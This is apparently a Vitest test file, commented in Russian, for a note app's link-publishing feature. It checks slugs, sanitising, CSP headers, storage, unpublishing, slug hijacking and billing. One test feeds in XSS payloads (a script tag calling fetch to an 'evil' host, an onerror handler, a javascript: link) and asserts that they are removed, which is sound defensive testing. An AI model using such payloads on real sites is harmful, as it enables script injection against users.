import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { createHarness, createUser, noDatabase, type Harness } from './helpers/app.ts';

/**
 * Публикация по ссылке (ТЗ §5.3) и публичная страница (SCREENS §10b `4j`).
 *
 * Отдельно проверяется главное свойство: HTML приходит от клиента, но со
 * страницы не может выполниться ни один скрипт — ни через санитайзер, ни в
 * обход него (CSP без `script-src`).
 */

describe.skipIf(noDatabase())('публикация', () => {
  let harness: Harness;

  beforeAll(async () => {
    /* Публикация по ТЗ — часть ЗАПИСКИ+, и проверка «без подписки не
       проходит» имеет смысл только при включённой оплате. По умолчанию она
       выключена: на MVP публиковать может каждый вошедший. */
    harness = await createHarness({ env: { BILLING_ENABLED: '1' } });
  });

  afterAll(async () => {
    await harness.close();
  });

  const publish = (token: Record<string, string>, payload: Record<string, unknown>) =>
    harness.app.inject({
      method: 'POST',
      url: '/api/v1/publish',
      headers: token,
      payload,
    });

  it('страница публикуется и отдаётся по слагу', async () => {
    const user = await createUser(harness);
    const response = await publish(user.authHeader, {
      title: 'Заметка о встрече',
      lead: 'Короткий лид',
      html: '<h2>Раздел</h2><p>Тело <strong>заметки</strong></p>',
      noteId: 'note-public',
    });
    expect(response.statusCode).toBe(201);

    const ref = response.json() as { slug: string; url: string };
    expect(ref.slug).toMatch(/^[a-z2-9]{12}$/);
    expect(ref.url).toBe(`https://zapiski.test/p/${ref.slug}`);

    const page = await harness.app.inject({ method: 'GET', url: `/p/${ref.slug}` });
    expect(page.statusCode).toBe(200);
    expect(page.headers['content-type']).toContain('text/html');

    const html = page.body;
    expect(html).toContain('Заметка о встрече');
    expect(html).toContain('Короткий лид');
    expect(html).toContain('<strong>заметки</strong>');
    expect(html).toContain('Опубликовано из ЗАПИСОК · только чтение');
  });

  it('скрипт из присланного HTML не доходит до страницы и не может выполниться', async () => {
    const user = await createUser(harness);
    const ref = (
      await publish(user.authHeader, {
        title: 'Проверка',
        html: '<p onclick="x()">текст</p><script>fetch("https://evil")</script><img src=x onerror=alert(1)><a href="javascript:alert(2)">ссылка</a>',
      })
    ).json() as { slug: string };

    const page = await harness.app.inject({ method: 'GET', url: `/p/${ref.slug}` });
    const html = page.body;

    expect(html).not.toContain('fetch("https://evil")');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('текст');

    // Второй слой: политика вовсе не содержит script-src, значит при
    // default-src 'none' скрипт не выполнится ни при каких обстоятельствах.
    const csp = String(page.headers['content-security-policy']);
    expect(csp).toContain("default-src 'none'");
    expect(csp).not.toContain('script-src');
    expect(csp).toContain("frame-ancestors 'none'");
  });

  it('открытый текст страницы лежит в томе, а не в БД', async () => {
    const user = await createUser(harness);
    const marker = 'уникальный-маркер-опубликованного-текста-91af';
    const ref = (
      await publish(user.authHeader, { title: 'Заголовок', html: `<p>${marker}</p>` })
    ).json() as { slug: string };

    const { rows } = await harness.db.query<{ table_name: string; column_name: string }>(
      `SELECT table_name, column_name FROM information_schema.columns
        WHERE table_schema = 'public'
          AND data_type IN ('text', 'character varying', 'jsonb', 'json', 'bytea')`,
    );
    for (const column of rows) {
      const hit = await harness.db.query<{ hits: number }>(
        `SELECT COUNT(*)::int AS hits FROM "${column.table_name}"
          WHERE "${column.column_name}"::text LIKE $1`,
        [`%${marker}%`],
      );
      expect(hit.rows[0]?.hits ?? 0, `${column.table_name}.${column.column_name}`).toBe(0);
    }

    // При этом страница отдаётся.
    const page = await harness.app.inject({ method: 'GET', url: `/p/${ref.slug}` });
    expect(page.body).toContain(marker);
  });

  it('снятая публикация отдаёт 404 и спокойный текст', async () => {
    const user = await createUser(harness);
    const ref = (
      await publish(user.authHeader, { title: 'Временная', html: '<p>текст</p>' })
    ).json() as { slug: string };

    const removed = await harness.app.inject({
      method: 'DELETE',
      url: `/api/v1/publish/${ref.slug}`,
      headers: user.authHeader,
    });
    expect(removed.statusCode).toBe(204);

    const page = await harness.app.inject({ method: 'GET', url: `/p/${ref.slug}` });
    expect(page.statusCode).toBe(404);
    expect(page.body).toContain('Страницы нет');
    // Тон реестра BEHAVIOR §11: без восклицательных знаков в видимом тексте.
    const visible = page.body.replace(/<style[\s\S]*?<\/style>/g, '').replace(/<[^>]*>/g, ' ');
    expect(visible).not.toContain('!');
  });

  it('чужой слаг не перезаписывается', async () => {
    const owner = await createUser(harness);
    const stranger = await createUser(harness);
    const ref = (
      await publish(owner.authHeader, { title: 'Моя', html: '<p>моё</p>' })
    ).json() as { slug: string };

    const hijack = await publish(stranger.authHeader, {
      title: 'Подмена',
      html: '<p>чужое</p>',
      slug: ref.slug,
    });
    expect(hijack.statusCode).toBe(404);

    const page = await harness.app.inject({ method: 'GET', url: `/p/${ref.slug}` });
    expect(page.body).toContain('моё');
  });

  it('публикация — часть ЗАПИСКИ+: без действующей подписки не проходит', async () => {
    const user = await createUser(harness, { subscribed: false });
    const response = await publish(user.authHeader, { title: 'Без подписки', html: '<p>x</p>' });
    expect(response.statusCode).toBe(402);
  });

  it('несуществующий слаг отдаёт страницу-заглушку, а не стек', async () => {
    const page = await harness.app.inject({ method: 'GET', url: '/p/abcdefabcdef' });
    expect(page.statusCode).toBe(404);
    expect(page.body).toContain('<!doctype html>');
  });
});
